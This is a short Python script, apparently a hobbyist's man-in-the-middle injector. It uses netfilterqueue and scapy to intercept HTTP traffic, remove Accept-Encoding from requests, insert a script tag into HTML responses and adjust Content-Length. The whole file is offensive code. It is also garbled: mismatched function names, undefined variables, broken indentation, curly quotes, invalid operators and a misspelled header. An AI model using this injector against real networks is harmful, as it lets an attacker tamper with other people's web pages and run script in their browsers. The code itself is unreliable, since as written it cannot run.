import netfilterqueue
import scapy.all as scapy
import re
	
def sey_load(packet, load):
	packet[scapy.Raw].load =load
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.TCP].chksum
	return packet	

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
  if scapy_payload.haslayer(scapy.Raw): 
load = scapy_packet[scapy.Raw].load
if scapy_packet[scapy.TCP].dport == 80:
				 print(“Request”)
				 load = re.sub(“Accept-Encoding:.*?\\r\\n”, “”, load)
				
elif scapy_packet[scapy.TCP].sport == 80:
				print(“Responce”)
				injection_code = “</body>”,”<script>alert(‘test’);</script>”
				load = load.replace(“</body>”, injection_code + “</body>”)
				content_lenght_search = re.search(“(?:Content-Lenght:\s)(\d*)”, load)
				if content_lenght_search and “text/html” in load:
					content_lenght = content_lenght_search.group(1)
					new_content_lenght = int(content_lenght) + int(injection_code)
					load = load.replace(content_lenght, str(new_content_lenght)
if load ! = scapy_packet[scapy.Raw].load:
				new_packet = set_load(scapy_packet, load)
				packet.set_payload(str(new_packet))
packet.accept()	

queue = netfilterqueue.NetfilterqQueue()
queue.bind(0, process_packet)
queue.run()
